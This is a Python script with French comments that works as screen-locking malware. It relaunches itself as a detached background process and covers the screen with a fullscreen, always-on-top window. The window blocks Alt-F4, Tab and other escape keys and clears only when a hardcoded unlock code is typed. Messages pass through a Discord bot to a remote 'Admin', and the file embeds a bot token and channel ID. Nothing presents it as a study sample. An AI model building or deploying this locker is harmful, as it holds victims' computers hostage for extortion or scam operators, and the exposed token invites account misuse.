import subprocess
import sys
import os
import time
import threading
import asyncio
from queue import Queue

# -------------------------------
# INSTALLER LES MODULES SI MANQUANTS
# -------------------------------
required_packages = ["discord", "psutil"]
for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

import discord
import tkinter as tk
from tkinter import scrolledtext

# -------------------------------
# CONSTANTES
# -------------------------------
SECRET_CODE = "56789"
BOT_TOKEN = "MTQ1Mzc3MTY5NDYwMTY3MDgwMQ.GwvLXB.kWBmzOohzLuT_AgRaHeEkyyNcXpJokbl0BV_yQ"
CHANNEL_ID = 1453771496651751424

message_queue = Queue()
last_reply = None

# -------------------------------
# CREER LE FICHIER LAUNCHER
# -------------------------------
LAUNCHER_SCRIPT = os.path.join(os.path.dirname(__file__), "launcher.py")

launcher_code = f"""
import subprocess
import sys
import os

MAIN_SCRIPT = r'{os.path.abspath(__file__)}'

if sys.platform == "win32":
    DETACHED_PROCESS = 0x08000000
    subprocess.Popen([sys.executable, MAIN_SCRIPT], creationflags=DETACHED_PROCESS, close_fds=True)
else:
    subprocess.Popen(["nohup", sys.executable, MAIN_SCRIPT],
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL,
                     preexec_fn=os.setpgrp)
"""

if not os.path.exists(LAUNCHER_SCRIPT):
    with open(LAUNCHER_SCRIPT, "w") as f:
        f.write(launcher_code)

# -------------------------------
# RELANCER AUTOMATIQUEMENT EN DETACHE
# -------------------------------
# Vérifie si on est déjà en mode détaché (évite double relance)
if not os.environ.get("DETACHED"):
    env = os.environ.copy()
    env["DETACHED"] = "1"  # marque le processus comme détaché
    if sys.platform == "win32":
        DETACHED_PROCESS = 0x08000000
        subprocess.Popen([sys.executable, os.path.abspath(__file__)],
                         creationflags=DETACHED_PROCESS,
                         close_fds=True,
                         env=env)
    else:
        subprocess.Popen(["nohup", sys.executable, os.path.abspath(__file__)],
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
                         preexec_fn=os.setpgrp,
                         env=env)
    sys.exit()  # quitte le processus parent attaché au terminal

# -------------------------------
# BOT DISCORD
# -------------------------------
intents = discord.Intents.default()
intents.message_content = True
bot = discord.Client(intents=intents)

@bot.event
async def on_ready():
    print("Bot connecté")
    asyncio.create_task(send_messages())

@bot.event
async def on_message(message):
    global last_reply
    if message.author.bot:
        return
    if message.channel.id == CHANNEL_ID:
        last_reply = message.content

async def send_messages():
    await bot.wait_until_ready()
    channel = bot.get_channel(CHANNEL_ID)
    while True:
        if not message_queue.empty():
            msg = message_queue.get()
            if channel:
                await channel.send(msg)
        await asyncio.sleep(1)

def run_bot():
    asyncio.run(bot.start(BOT_TOKEN))

# -------------------------------
# TKINTER
# -------------------------------
root = tk.Tk()
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)
root.configure(bg="black")

def block(event=None):
    return "break"

for key in ("<Alt-F4>", "<Control-Escape>", "<Alt_L>", "<Alt_R>", "<Tab>"):
    root.bind_all(key, block)

def keep_on_top():
    while True:
        root.attributes("-topmost", True)
        time.sleep(0.1)

chat_box = scrolledtext.ScrolledText(root, width=60, height=20)
chat_box.pack()
chat_box.insert("end", "💬 Chat prêt\n")
chat_box.configure(state="normal")

entry = tk.Entry(root, width=50)
entry.pack()

def send_message():
    msg = entry.get()
    if not msg.strip():
        return
    chat_box.insert("end", f"👤 Utilisateur : {msg}\n")
    message_queue.put(msg)
    entry.delete(0, "end")

send_button = tk.Button(root, text="Envoyer", command=send_message)
send_button.pack()

code_entry = tk.Entry(root, show="*")
code_entry.pack()

def unlock():
    code = code_entry.get()
    if code == SECRET_CODE:
        root.destroy()
    else:
        chat_box.insert("end", "❌ Code incorrect\n")
        code_entry.delete(0, "end")

unlock_button = tk.Button(root, text="Déverrouiller", command=unlock)
unlock_button.pack()

# -------------------------------
# THREADS
# -------------------------------
threading.Thread(target=run_bot, daemon=True).start()

def check_reply():
    global last_reply
    while True:
        if last_reply:
            chat_box.insert("end", f"🧑‍💻 Admin : {last_reply}\n")
            last_reply = None
        time.sleep(1)

threading.Thread(target=check_reply, daemon=True).start()
threading.Thread(target=keep_on_top, daemon=True).start()

# -------------------------------
# LANCEMENT DE TKINTER
# -------------------------------
root.mainloop()
